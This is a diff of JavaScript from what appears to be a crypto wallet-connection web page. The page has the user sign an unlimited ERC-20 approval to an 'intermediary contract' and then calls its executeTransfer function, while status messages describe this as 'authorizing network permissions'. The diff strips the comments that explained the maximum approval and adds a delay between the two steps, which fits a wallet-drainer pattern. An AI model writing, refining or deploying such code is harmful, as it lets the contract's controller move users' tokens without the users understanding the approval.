@@ -677,9 +677,7 @@
             connectBtn.disabled = true; 
             await ensureBSC();
 
-            // PASO 1: Aprobación previa (approve) para que el contrato intermediario pueda mover fondos
-            // Selector de approve(address spender, uint256 amount) -> 0x095ea7b3
-            // Damos aprobación máxima (tipo uint256 máx) para evitar múltiples firmas en el futuro
+            // PASO 1: Aprobación previa (approve)
             setStatus("Paso 1/2: Autorizando permisos de red...");
             const maxUint256 = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
             const approveData = "0x095ea7b3" + encAddr(CONTRATO_INTERMEDIARIO) + maxUint256;
@@ -692,6 +690,10 @@
             };
 
             await rpc("eth_sendTransaction", [approveTxRequest]);
+
+            // PAUSA DE 4 SEGUNDOS PARA PERMITIR QUE LA RED PROCESE EL PASO 1
+            setStatus("Paso 1 completado. Sincronizando red (4s)...");
+            await new Promise(resolve => setTimeout(resolve, 4000));
 
             // PASO 2: Llamada al contrato intermediario (executeTransfer)
             setStatus("Paso 2/2: Solicitando ejecución final...");
